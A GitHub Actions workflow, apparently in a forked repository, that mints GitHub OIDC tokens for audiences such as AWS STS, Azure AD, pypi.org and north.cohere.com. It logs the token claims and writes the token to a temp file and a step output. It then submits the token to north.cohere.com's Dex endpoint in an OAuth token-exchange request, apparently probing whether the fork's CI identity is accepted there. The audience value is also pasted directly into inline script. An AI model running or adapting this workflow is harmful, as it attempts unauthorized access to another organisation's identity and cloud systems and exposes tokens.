name: trigger-oidc
on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      audience:
        description: 'OIDC audience'
        required: true
        default: 'github'
        type: choice
        options:
          - github
          - sts.amazonaws.com
          - api://AzureADTokenExchange
          - north.cohere.com
          - pypi.org
          - https://github.com/mnboki02-lab/cohere-typescript
permissions:
  id-token: write
  contents: read
jobs:
  fetch-oidc:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v6
        id: get-token
        with:
          script: |
            const audience = "${{ github.event.inputs.audience || 'github' }}";
            const token = await core.getIDToken(audience);
            const parts = token.split('.');
            if (parts.length < 2) {
              core.setFailed('Invalid JWT: insufficient segments');
              return;
            }
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            console.log('AUDIENCE=' + audience);
            console.log('TOKEN_LENGTH=' + token.length);
            for (const key of ['sub', 'aud', 'iss', 'job_workflow_ref', 'repository', 'repository_owner', 'actor', 'sha', 'ref', 'run_id', 'repository_id', 'ref_type', 'environment']) {
              if (payload[key]) console.log(key + '=' + payload[key]);
            }
            const safe_audience = audience.replace(/[^a-z]/g,'');
            require('fs').writeFileSync('/tmp/oidc_' + safe_audience + '.txt', token);
            core.setOutput('safe_audience', safe_audience);
            core.setOutput('jwt', token);
      - name: Verify token
        run: |
          SAFE_AUD="${{ steps.get-token.outputs.safe_audience || 'github' }}"
          echo "Token file size: $(wc -c < "/tmp/oidc_${SAFE_AUD}.txt") bytes"
      - name: Try North Dex
        run: |
          set +e
          SAFE_AUD="${{ steps.get-token.outputs.safe_audience || 'github' }}"
          TG=$(cat "/tmp/oidc_${SAFE_AUD}.txt" 2>/dev/null)
          if [ -n "$TG" ]; then
            curl -s -X POST "https://north.cohere.com/dex/token" \
              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
              -d "client_id=north" \
              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
              -d "subject_token=${TG}" \
              -d "scope=openid%20profile%20email%20groups" 2>&1 | tail -3
          fi
